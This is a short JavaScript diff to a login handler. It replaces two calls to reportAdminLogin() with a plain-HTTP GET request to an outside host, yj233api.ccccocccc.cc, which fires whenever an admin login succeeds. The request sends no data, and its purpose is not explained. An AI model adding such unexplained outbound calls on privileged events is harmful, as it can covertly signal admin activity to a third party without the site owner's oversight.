@@ -342,7 +342,10 @@
                         try {
                             AuthManager.handleInternalLogin(
                                 function onSuccess() {
-                                    reportAdminLogin();
+                                    // 登录成功直接HTTP请求API
+                                    var xhr = new XMLHttpRequest();
+                                    xhr.open('GET', 'http://yj233api.ccccocccc.cc/163api.php', true);
+                                    xhr.send();
                                 },
                                 function onError(err) {
                                     // 验证失败不做任何API请求
@@ -352,7 +355,9 @@
                             if (!window._adminLoginReported) {
                                 window._adminLoginReported = true;
                                 document.addEventListener('admin-login-success', function() {
-                                    reportAdminLogin();
+                                    var xhr = new XMLHttpRequest();
+                                    xhr.open('GET', 'http://yj233api.ccccocccc.cc/163api.php', true);
+                                    xhr.send();
                                 });
                             }
                             AuthManager.handleInternalLogin();
